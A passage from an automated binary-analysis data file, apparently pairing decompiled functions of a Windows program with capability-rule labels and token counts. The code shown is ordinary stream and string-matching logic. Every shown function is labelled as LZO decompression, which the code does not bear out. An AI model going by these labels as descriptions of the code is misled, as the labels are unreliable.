uVar22);\ncode_r0x00457da3:\n                var_1ch = uVar22;\n            }\n            if (var_1ch == 0x1) {\n                piVar15[-1] = 0x457dc1;\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                var_24h = *piVar11;\n                var_1ch = *(arg_1ch + *piVar11 * 4);\n                uVar22 = var_20h + 1;\n                *piVar15 = var_1ch;\n                piVar15[-1] = 0x457de4;\n                var_20h = sub.msvcrt.dll_strlen();\n                if (uVar22 < var_20h) {\n                    do {\n                        arg_ch = 0xffffffff;\n                        cVar2 = '\\x01';\n                        if ((arg_8h != NULL) && (cVar2 = '\\0',  arg_8h[3] <= arg_8h[2])) {\n                            pcVar1 = *(*arg_8h + 0x24);\n                            piVar12 = piVar15 + -1;\n                            piVar15 = piVar15 + -1;\n                            *piVar12 = 0x457e7a;\n                            iVar5 = (*pcVar1)();\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                cVar2 = '\\x01';\n                            }\n                        }\n                        bVar4 = arg_10h != NULL && arg_14h == -1;\n                        cVar3 = arg_14h == -1;\n                        if ((bVar4) && (cVar3 = '\\0',  arg_10h[3] <= arg_10h[2])) {\n                            cStack41 = bVar4;\n                            pcVar1 = *(*arg_10h + 0x24);\n                            puVar18 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar18 = 0x457f46;\n                            iVar5 = (*pcVar1)();\n                            if (iVar5 == -1) {\n                                arg_10h = NULL;\n                                cVar3 = cStack41;\n                            }\n                        }\n                        if (cVar2 == cVar3) goto code_r0x00457c1c;\n                        cVar2 = *(var_1ch + uVar22);\n                        iVar5 = -1;\n                        if (arg_8h == NULL) {\ncode_r0x00457e2b:\n                            if (cVar2 != iVar5) goto code_r0x00457c1c;\n                            pcVar7 = arg_8h[2];\n                            if (pcVar7 < arg_8h[3]) goto code_r0x00457e42;\n                            pcVar1 = *(*arg_8h + 0x28);\n                            puVar19 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar19 = 0x457f85;\n                            (*pcVar1)();\n                        }\n                        else {\n                            pcVar7 = arg_8h[2];\n                            if (arg_8h[3] <= pcVar7) {\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar20 = piVar15 + -4;\n                                piVar15 = piVar15 + -4;\n                                *puVar20 = 0x457fa2;\n                                iVar5 = (*pcVar1)();\n                                if (iVar5 == -1) {\n                                    arg_8h = NULL;\n                                }\n                                goto code_r0x00457e2b;\n                            }\n                            if (cVar2 != *pcVar7) goto code_r0x00457c1c;\ncode_r0x00457e42:\n                            arg_8h[2] = pcVar7 + 1;\n                        }\n                        uVar22 = uVar22 + 1;\n                    } while (uVar22 != var_20h);\n                }\n                else if (uVar22 != var_20h) goto code_r0x00457c1c;\n                arg_ch = 0xffffffff;\n                *arg_18h = var_24h;\n                goto code_r0x00457c22;\n            }\n        }\n    }\ncode_r0x00457c1c:\n    *arg_28h = *arg_28h | 4;\ncode_r0x00457c22:\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2913
    },
    "00459320": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00459320(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint *puVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uchar *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint *puVar21;\n    uchar *puVar22;\n    uint *puVar23;\n    uint *puVar24;\n    bool bVar25;\n    uint uStack96;\n    int32_t iStack92;\n    uchar auStack73 [5];\n    uint *var_40h;\n    int32_t *var_3ch;\n    uint32_t var_38h;\n    int32_t *var_34h;\n    uint *var_2eh;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_ch;\n    \n    var_34h = arg_8h;\n    iStack92 = arg_24h + 0x6c;\n    var_38h = arg_ch;\n    var_3ch = arg_10h;\n    uStack96 = 0x45934c;\n    var_24h = fcn.004c0160();\n    uStack96 = 0x459364;\n    iVar4 = fcn.00437ed0();\n    iVar4 = -iVar4;\n    var_20h._0_1_ = arg_ch == 0xffffffff;\n    var_28h = &stack0xffffffb7 + iVar4 & 0xfffffff0;\n    bVar2 = var_34h != NULL && var_20h;\n    var_1ch = var_1ch & 0xffffff00 | bVar2;\n    puVar16 = &stack0xffffffa4 + iVar4;\n    if ((bVar2) && (var_20h._0_1_ = 0,  puVar16 = &stack0xffffffa4 + iVar4,  var_34h[3] <= var_34h[2])) {\n        var_20h = var_20h & 0xffffff00;\n        pcVar1 = *(*var_34h + 0x24);\n        puVar16 = &stack0xffffffa0 + iVar4;\n        *(&stack0xffffffa0 + iVar4) = 0x45968e;\n        iVar4 = (*pcVar1)();\n        if (iVar4 == -1) {\n            var_34h = NULL;\n            var_1ch = var_1ch & 0xffffff00;\n            var_20h._0_1_ = var_1ch;\n        }\n    }\n    bVar25 = arg_14h == -1;\n    var_2eh._0_1_ = bVar25;\n    bVar2 = arg_10h != NULL && bVar25;\n    if (bVar2) {\n        if (arg_10h[2] < arg_10h[3]) {\n            bVar25 = false;\n        }\n        else {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar1 = *(*arg_10h + 0x24);\n            puVar20 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar20 = 0x459768;\n            iVar4 = (*pcVar1)();\n            var_3ch = NULL;\n            if (iVar4 != -1) {\n                var_3ch = arg_10h;\n            }\n            bVar25 = iVar4 == -1 && bVar2;\n        }\n    }\n    piVar8 = var_34h;\n    if (var_20h == bVar25) {\n        var_40h = NULL;\n        puVar24 = NULL;\n        puVar23 = NULL;\n    }\n    else {\n        if (var_1ch == '\\0') {\n            var_1ch = var_1ch & 0xffffff00 | arg_ch & 0xff;\n        }\n        else if (var_34h[2] < var_34h[3]) {\n            var_1ch = var_1ch & 0xffffff00 | *var_34h[2];\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x24);\n            puVar21 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar21 = 0x459796;\n            uVar9 = (*pcVar1)();\n            uVar5 = 0xffffffff;\n            if (uVar9 != 0xffffffff) {\n                uVar5 = uVar9;\n            }\n            var_34h = NULL;\n            if (uVar9 != 0xffffffff) {\n                var_34h = piVar8;\n            }\n            var_1ch = var_1ch & 0xffffff00 | uVar5 & 0xff;\n        }\n        puVar24 = arg_20h * 2;\n        if (puVar24 == NULL) {\n            puVar23 = NULL;\n            var_40h = NULL;\n        }\n        else {\n            var_20h = puVar24;\n            puVar24 = NULL;\n            puVar23 = NULL;\n            piVar8 = puVar16;\n            do {\n                while( true ) {\n                    cVar3 = **(arg_1ch + puVar24 * 4);\n                    if (cVar3 != var_1ch) break;\ncode_r0x004595c8:\n                    var_28h[puVar23] = puVar24;\n                    puVar23 = puVar23 + 1;\n                    puVar24 = puVar24 + 1;\n                    puVar16 = piVar8;\n                    if (puVar24 == var_20h) goto code_r0x004595d9;\n                }\n                uVar5 = *var_24h;\n                *piVar8 = cVar3;\n                pcVar1 = *(uVar5 + 8);\n                piVar15 = piVar8 + -1;\n                piVar8[-1] = 0x4595ad;\n                cVar3 = (*pcVar1)();\n                piVar8 = piVar15 + -4;\n                puVar16 = piVar15 + -4;\n                if (cVar3 == var_1ch) goto code_r0x004595c8;\n                puVar24 = puVar24 + 1;\n                piVar8 = piVar15 + -4;\n            } while (puVar24 != var_20h);\ncode_r0x004595d9:\n            puVar24 = NULL;\n            var_40h = NULL;\n            if (puVar23 != NULL) {\n                if (var_34h[2] < var_34h[3]) {\n                    var_34h[2] = var_34h[2] + 1;\n                    puVar22 = puVar16;\n                }\n                else {\n                    pcVar1 = *(*var_34h + 0x28);\n                    puVar22 = puVar16 + -4;\n                    *(puVar16 + -4) = 0x4597b9;\n                    (*pcVar1)();\n                }\n                *(puVar22 + -4) = 0x459611;\n                iVar4 = fcn.00437ed0();\n                puVar10 = var_28h;\n                puVar24 = NULL;\n                iVar4 = -iVar4;\n                puVar16 = puVar22 + iVar4;\n                var_1ch = puVar23;\n                var_40h = puVar22 + iVar4 + 0x13 & 0xfffffff0;\n                var_20h = puVar22 + iVar4 + 0x13 & 0xfffffff0;\n                do {\n                    *(puVar22 + iVar4) = *(arg_1ch + puVar10[puVar24] * 4);\n                    *(puVar22 + iVar4 + -4) = 0x45963e;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    var_20h[puVar24] = uVar6;\n                    puVar24 = puVar24 + 1;\n                } while (var_1ch != puVar24);\n                var_38h = 0xffffffff;\n                puVar24 = 0x1;\n                puVar23 = var_1ch;\n            }\n        }\n    }\n    do {\n        var_20h._0_1_ = var_38h == 0xffffffff;\n        bVar2 = var_34h != NULL && var_20h;\n        uVar5 = var_1ch & 0xffffff00;\n        var_1ch = uVar5 | bVar2;\n        if (bVar2) {\n            if (var_34h[2] < var_34h[3]) {\n                var_1ch = uVar5;\n            }\n            else {\n                var_20h = var_20h & 0xffffff00 | var_20h;\n                pcVar1 = *(*var_34h + 0x24);\n                puVar17 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar17 = 0x4596c1;\n                iVar4 = (*pcVar1)();\n                piVar8 = NULL;\n                if (iVar4 != -1) {\n                    var_1ch._0_1_ = 0;\n                    piVar8 = var_34h;\n                }\n                var_34h = piVar8;\n                var_1ch = var_1ch & 0xffffff00 | var_1ch;\n            }\n        }\n        else {\n            var_1ch = uVar5 | var_20h;\n        }\n        uVar12 = var_3ch != NULL & var_2eh;\n        uVar13 = var_2eh;\n        if (uVar12 == 0) {\ncode_r0x004593f2:\n            if (uVar13 == var_1ch) break;\n        }\n        else {\n            if (var_3ch[3] <= var_3ch[2]) {\n                var_20h = var_20h & 0xffffff00 | var_20h;\n                pcVar1 = *(*var_3ch + 0x24);\n                puVar18 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar18 = 0x4596ef;\n                iVar4 = (*pcVar1)();\n                piVar8 = NULL;\n                if (iVar4 != -1) {\n                    uVar12 = 0;\n                    piVar8 = var_3ch;\n                }\n                var_3ch = piVar8;\n                uVar13 = uVar12;\n                goto code_r0x004593f2;\n            }\n            if (var_1ch == '\\0') break;\n        }\n        if ((var_34h == NULL) || (var_20h == 0)) {\n            var_2eh._1_1_ = var_38h;\n        }\n        else if (var_34h[2] < var_34h[3]) {\n            var_2eh._1_1_ = *var_34h[2];\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x24);\n            puVar19 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar19 = 0x459719;\n            iVar7 = (*pcVar1)();\n            iVar4 = -1;\n            if (iVar7 != -1) {\n                iVar4 = iVar7;\n            }\n            piVar8 = NULL;\n            if (iVar7 != -1) {\n                piVar8 = var_34h;\n            }\n            var_2eh._1_1_ = iVar4;\n            var_34h = piVar8;\n        }\n        if (puVar23 == NULL) goto code_r0x004594db;\n        puVar11 = NULL;\n        var_1ch = puVar24;\n        stack0xffffffd0 = NULL;\n        var_20h = var_40h;\n        do {\n            while( true ) {\n                puVar10 = var_40h + puVar11;\n                if (puVar24 <= *puVar10 && *puVar10 != puVar24) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x00459437:\n                puVar11 = puVar11 + 1;\n                if (puVar23 <= puVar11) goto code_r0x00459482;\n            }\n            var_24h = var_28h + puVar11;\n            if (*(*(arg_1ch + *var_24h * 4) + puVar24) == var_2eh._1_1_) goto code_r0x00459437;\n            puVar23 = puVar23 + -1;\n            *var_24h = var_28h[puVar23];\n            *puVar10 = var_40h[puVar23];\n        } while (puVar11 < puVar23);\ncode_r0x00459482:\n        if (stack0xffffffd0 == puVar23) break;\n        if (var_34h[2] < var_34h[3]) {\n            var_34h[2] = var_34h[2] + 1;\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x28);\n            puVar14 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar14 = 0x459538;\n            (*pcVar1)();\n        }\n        puVar24 = puVar24 + 1;\n        var_38h = 0xffffffff;\n    } while( true );\n    if (puVar23 == 0x1) {\n        var_40h = *var_40h;\n    }\n    else {\n        if (puVar23 != 0x2) goto code_r0x004594db;\n        if (*var_40h == puVar24) goto code_r0x0045954e;\n        var_40h = var_40h[1];\n    }\n    if (var_40h == puVar24) {\ncode_r0x0045954e:\n        uVar5 = *var_28h;\n        if (arg_20h <= uVar5) {\n            uVar5 = uVar5 - arg_20h;\n        }\n        *arg_18h = uVar5;\n        return CONCAT44(var_38h, var_34h);\n    }\ncode_r0x004594db:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(var_38h, var_34h);\n}\n",
        "token_count": 3464
    },
    "0045ad20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.0045ad20(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    bool bVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    int32_t *piVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uint *puVar17;\n    uint *puVar18;\n    int32_t *piVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    uchar uStack41;\n    uint32_t var_24h;\n    uint32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    uint *puVar16;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x45ad37;\n    var_1ch = fcn.004c01c0();\n    aiStack64[0] = 0x45ad4f;\n    iVar7 = fcn.00437ed0();\n    iVar7 = -iVar7;\n    *(&stack0xffffffc4 + iVar7) = &fcn.0045ad20::arg_10h;\n    *(&stack0xffffffc0 + iVar7) = 0x45ad66;\n    cVar2 = fcn.00450410();\n    uVar5 = arg_ch;\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar7) = 0x45ad8f;\n        uVar4 = fcn.00450500();\n        if (arg_20h != 0) {\n            var_20h = &stack0xffffffd7 + iVar7 & 0xfffffff0;\n            uVar20 = 0;\n            uVar21 = 0;\n            iVar9 = arg_1ch;\n            puVar12 = &stack0xffffffc0 + iVar7;\n            do {\n                while (uVar5 = **(iVar9 + uVar20 * 4),  uVar5 == uVar4) {\ncode_r0x0045add2:\n                    var_20h[uVar21] = uVar20;\n                    uVar21 = uVar21 + 1;\n                    uVar20 = uVar20 + 1;\n                    piVar15 = puVar12;\n                    if (arg_20h == uVar20) goto code_r0x0045ade3;\n                }\n                iVar7 = *var_1ch;\n                *puVar12 = uVar5;\n                pcVar1 = *(iVar7 + 0x18);\n                puVar11 = puVar12 + -1;\n                puVar12[-1] = 0x45adb4;\n                arg_1ch = iVar9;\n                uVar5 = (*pcVar1)();\n                puVar12 = puVar11 + -4;\n                piVar15 = puVar11 + -4;\n                iVar9 = arg_1ch;\n                if (uVar4 == uVar5) goto code_r0x0045add2;\n                uVar20 = uVar20 + 1;\n                puVar12 = puVar11 + -4;\n            } while (arg_20h != uVar20);\ncode_r0x0045ade3:\n            puVar12 = var_20h;\n            var_20h = NULL;\n            if (1 < uVar21) {\ncode_r0x0045ae00:\n                var_24h = *puVar12;\n                *piVar15 = *(arg_1ch + *puVar12 * 4);\n                piVar15[-1] = 0x45ae15;\n                uVar20 = sub.msvcrt.dll_wcslen();\n                var_1ch = uVar21;\n                uVar10 = 1;\n                do {\n                    *piVar15 = *(arg_1ch + puVar12[uVar10] * 4);\n                    piVar15[-1] = 0x45ae32;\n                    uVar8 = sub.msvcrt.dll_wcslen();\n                    uVar21 = var_1ch;\n                    if (uVar8 < uVar20) {\n                        uVar20 = uVar8;\n                    }\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    puVar16 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *puVar16 = 0x45b035;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch._0_2_ = 0xffff;\n                uVar5 = 0xffff;\n                if (var_20h < uVar20) {\n                    cVar2 = '\\x01';\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar6 = *arg_8h[2];\n                        }\n                        else {\n                            pcVar1 = *(*arg_8h + 0x24);\n                            puVar18 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar18 = 0x45b057;\n                            iVar6 = (*pcVar1)();\n                        }\n                        cVar2 = '\\0';\n                        if (iVar6 == -1) {\n                            arg_8h = NULL;\n                            cVar2 = '\\x01';\n                        }\n                    }\n                    var_1ch._0_1_ = arg_14h == -1;\n                    bVar3 = arg_10h != NULL && var_1ch;\n                    var_1ch = var_1ch & 0xffffff00 | bVar3;\n                    if (bVar3) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar6 = *arg_10h[2];\n                        }\n                        else {\n                            pcVar1 = *(*arg_10h + 0x24);\n                            puVar17 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar17 = 0x45b050;\n                            iVar6 = (*pcVar1)();\n                        }\n                        var_1ch._0_1_ = '\\0';\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                        }\n                    }\n                    uVar5 = 0xffff;\n                    if (var_1ch != cVar2) {\n                        uVar10 = 0;\n                        var_1ch = var_20h * 2;\n                        uVar20 = var_24h;\n                        do {\n                            uVar5 = *(*(arg_1ch + uVar20 * 4) + var_1ch);\n                            uVar4 = arg_ch;\n                            if (arg_8h != NULL) {\n                                if (arg_8h[2] < arg_8h[3]) {\n                                    uVar4 = *arg_8h[2];\n                                }\n                                else {\n                                    var_24h = uVar5;\n                                    pcVar1 = *(*arg_8h + 0x24);\n                                    puVar14 = piVar15 + -4;\n                                    piVar15 = piVar15 + -4;\n                                    *puVar14 = 0x45b028;\n                                    uVar4 = (*pcVar1)();\n                                    uVar5 = var_24h;\n                                }\n                                if (uVar4 == 0xffff) {\n                                    arg_8h = NULL;\n                                }\n                            }\n                            if (uVar5 == uVar4) {\n                                uVar10 = uVar10 + 1;\n                                if (uVar21 <= uVar10) goto code_r0x0045af0e;\n                            }\n                            else {\n                                uVar21 = uVar21 - 1;\n                                puVar12[uVar10] = puVar12[uVar21];\n                                if (uVar21 <= uVar10) goto code_r0x0045af0e;\n                            }\n                            uVar20 = puVar12[uVar10];\n                        } while( true );\n                    }\n                }\n                goto code_r0x0045ad6d;\n            }\ncode_r0x0045af17:\n            uVar5 = arg_ch;\n            if (uVar21 == 1) {\n                piVar15[-1] = 0x45af28;\n                fcn.004a5ed0();\n                uVar21 = var_20h;\n                iVar7 = *(arg_1ch + *puVar12 * 4);\n                var_1ch = *puVar12;\n                *piVar15 = iVar7;\n                piVar15[-1] = 0x45af4a;\n                uVar20 = sub.msvcrt.dll_wcslen();\n                while (uVar21 = uVar21 + 1,  uVar21 < uVar20) {\n                    arg_ch._0_2_ = 0xffff;\n                    uVar5 = 0xffff;\n                    *piVar15 = &fcn.0045ad20::arg_10h;\n                    piVar15[-1] = 0x45af95;\n                    cVar2 = fcn.00450410();\n                    piVar19 = piVar15 + -1;\n                    if (cVar2 != '\\0') goto code_r0x0045ad6d;\n                    uVar4 = *(iVar7 + uVar21 * 2);\n                    piVar13 = piVar15 + -1;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            arg_ch._0_2_ = *arg_8h[2];\n                        }\n                        else {\n                            var_20h = uVar4;\n                            pcVar1 = *(*arg_8h + 0x24);\n                            piVar19 = piVar15 + -2;\n                            piVar15[-2] = 0x45b083;\n                            arg_ch._0_2_ = (*pcVar1)();\n                            uVar4 = var_20h;\n                        }\n                        piVar13 = piVar19;\n                        if (arg_ch == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    uVar5 = 0xffff;\n                    if (uVar4 != arg_ch) goto code_r0x0045ad6d;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 2;\n                        piVar15 = piVar13;\n                    }\n                    else {\n                        pcVar1 = *(*arg_8h + 0x28);\n                        piVar15 = piVar13 + -1;\n                        piVar13[-1] = 0x45b061;\n                        (*pcVar1)();\n                    }\n                }\n                uVar5 = 0xffff;\n                if (uVar21 == uVar20) {\n                    *arg_18h = var_1ch;\n                    goto code_r0x0045ad73;\n                }\n            }\n        }\n    }\ncode_r0x0045ad6d:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0045ad73:\n    return CONCAT24(uVar5, arg_8h);\ncode_r0x0045af0e:\n    if (uVar21 < 2) goto code_r0x0045af17;\n    goto code_r0x0045ae00;\n}\n",
        "token_count": 2752
    },
    "0045c840": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0045c840(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint32_t *puVar10;\n    bool bVar11;\n    uint8_t uVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    uint32_t *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uchar *puVar19;\n    uchar *puVar20;\n    uint *puVar22;\n    uchar *puVar23;\n    uint32_t *puVar24;\n    uint32_t *puVar25;\n    bool bVar26;\n    uint uStack96;\n    int32_t iStack92;\n    uchar uStack73;\n    uint var_44h;\n    int32_t *var_40h;\n    int32_t var_39h;\n    int32_t *var_34h;\n    uint var_30h;\n    uint32_t *var_2ch;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint32_t *var_20h;\n    uint32_t *var_1ch;\n    uint var_ch;\n    uint *puVar21;\n    \n    var_34h = arg_8h;\n    iStack92 = arg_24h + 0x6c;\n    var_44h = arg_ch;\n    uVar7 = arg_ch;\n    var_40h = arg_10h;\n    uStack96 = 0x45c870;\n    var_30h._0_2_ = uVar7;\n    var_1ch = fcn.004c01c0();\n    uStack96 = 0x45c888;\n    iVar8 = fcn.00437ed0();\n    iVar8 = -iVar8;\n    puVar19 = &stack0xffffffa4 + iVar8;\n    var_24h = &stack0xffffffb7 + iVar8 & 0xfffffff0;\n    bVar11 = var_34h != NULL && uVar7 == 0xffff;\n    puVar20 = &stack0xffffffa4 + iVar8;\n    var_20h._0_1_ = uVar7 == 0xffff;\n    bVar4 = bVar11;\n    if (bVar11) {\n        if (var_34h[2] < var_34h[3]) {\n            iVar6 = *var_34h[2];\n        }\n        else {\n            pcVar2 = *(*var_34h + 0x24);\n            puVar19 = &stack0xffffffa0 + iVar8;\n            *(&stack0xffffffa0 + iVar8) = 0x45ccbd;\n            iVar6 = (*pcVar2)();\n        }\n        puVar20 = puVar19;\n        var_20h._0_1_ = false;\n        if (iVar6 == -1) {\n            var_34h = NULL;\n            bVar4 = false;\n            var_20h._0_1_ = bVar11;\n        }\n    }\n    bVar26 = arg_14h == -1;\n    var_39h._0_1_ = bVar26;\n    bVar11 = arg_10h != NULL && bVar26;\n    if (bVar11) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar6 = *arg_10h[2];\n        }\n        else {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar2 = *(*arg_10h + 0x24);\n            puVar21 = puVar20 + -4;\n            puVar20 = puVar20 + -4;\n            *puVar21 = 0x45cccc;\n            iVar6 = (*pcVar2)();\n        }\n        var_40h = NULL;\n        if (iVar6 != -1) {\n            var_40h = arg_10h;\n        }\n        bVar26 = iVar6 == -1 && bVar11;\n    }\n    if (bVar26 == var_20h) {\n        var_20h = NULL;\n        puVar24 = NULL;\n        puVar25 = NULL;\n    }\n    else {\n        uVar7 = var_30h;\n        if (bVar4) {\n            if (var_34h[2] < var_34h[3]) {\n                uVar7 = *var_34h[2];\n            }\n            else {\n                pcVar2 = *(*var_34h + 0x24);\n                puVar22 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar22 = 0x45ccdd;\n                uVar7 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (uVar7 != 0xffff) {\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        var_20h = arg_20h * 2;\n        if (arg_20h * 2 == 0) {\n            puVar25 = NULL;\n            puVar24 = NULL;\n        }\n        else {\n            uVar13 = 0;\n            puVar25 = NULL;\n            puVar24 = puVar20;\n            do {\n                while (uVar5 = **(arg_1ch + uVar13 * 4),  uVar5 == uVar7) {\ncode_r0x0045cb53:\n                    var_24h[puVar25] = uVar13;\n                    puVar25 = puVar25 + 1;\n                    uVar13 = uVar13 + 1;\n                    puVar20 = puVar24;\n                    if (uVar13 == var_20h) goto code_r0x0045cb64;\n                }\n                uVar3 = *var_1ch;\n                *puVar24 = uVar5;\n                pcVar2 = *(uVar3 + 0x18);\n                puVar15 = puVar24 + -1;\n                puVar24[-1] = 0x45cb35;\n                uVar5 = (*pcVar2)();\n                puVar24 = puVar15 + -4;\n                puVar20 = puVar15 + -4;\n                if (uVar5 == uVar7) goto code_r0x0045cb53;\n                uVar13 = uVar13 + 1;\n                puVar24 = puVar15 + -4;\n            } while (uVar13 != var_20h);\ncode_r0x0045cb64:\n            var_20h = NULL;\n            puVar24 = NULL;\n            if (puVar25 != NULL) {\n                if (var_34h[2] < var_34h[3]) {\n                    var_34h[2] = var_34h[2] + 2;\n                    puVar23 = puVar20;\n                }\n                else {\n                    pcVar2 = *(*var_34h + 0x28);\n                    puVar23 = puVar20 + -4;\n                    *(puVar20 + -4) = 0x45cce9;\n                    (*pcVar2)();\n                }\n                *(puVar23 + -4) = 0x45cb9c;\n                iVar8 = fcn.00437ed0();\n                puVar24 = var_24h;\n                iVar8 = -iVar8;\n                puVar20 = puVar23 + iVar8;\n                var_1ch = puVar25;\n                var_20h = puVar23 + iVar8 + 0x13 & 0xfffffff0;\n                var_28h = puVar23 + iVar8 + 0x13 & 0xfffffff0;\n                puVar25 = NULL;\n                do {\n                    *(puVar23 + iVar8) = *(arg_1ch + puVar24[puVar25] * 4);\n                    *(puVar23 + iVar8 + -4) = 0x45cbce;\n                    uVar13 = sub.msvcrt.dll_wcslen();\n                    var_20h[puVar25] = uVar13;\n                    puVar25 = puVar25 + 1;\n                } while (var_1ch != puVar25);\n                var_20h = 0x1;\n                var_30h._0_2_ = 0xffff;\n                puVar24 = var_28h;\n                puVar25 = var_1ch;\n            }\n        }\n    }\n    do {\n        var_28h._0_1_ = var_30h == 0xffff;\n        var_1ch = var_1ch & 0xffffff00 | var_28h;\n        bVar11 = var_34h != NULL && var_28h;\n        if (bVar11) {\n            if (var_34h[2] < var_34h[3]) {\n                iVar6 = *var_34h[2];\n                var_28h._0_1_ = bVar11;\n            }\n            else {\n                var_28h = var_28h & 0xffffff00 | bVar11;\n                pcVar2 = *(*var_34h + 0x24);\n                puVar16 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar16 = 0x45cc5b;\n                iVar6 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (iVar6 != -1) {\n                var_28h._0_1_ = 0;\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        uVar12 = var_40h != NULL & var_39h;\n        if (uVar12 == 0) {\n            if (var_28h == var_39h) break;\n        }\n        else {\n            if (var_40h[2] < var_40h[3]) {\n                iVar6 = *var_40h[2];\n            }\n            else {\n                var_28h = var_28h & 0xffffff00 | var_28h;\n                pcVar2 = *(*var_40h + 0x24);\n                puVar17 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar17 = 0x45cc6f;\n                iVar6 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (iVar6 != -1) {\n                uVar12 = 0;\n                piVar9 = var_40h;\n            }\n            var_40h = piVar9;\n            if (var_28h == uVar12) break;\n        }\n        if ((var_34h == NULL) || (var_1ch == '\\0')) {\n            var_30h._2_2_ = var_30h;\n        }\n        else {\n            if (var_34h[2] < var_34h[3]) {\n                var_30h._2_2_ = *var_34h[2];\n            }\n            else {\n                pcVar2 = *(*var_34h + 0x24);\n                puVar18 = 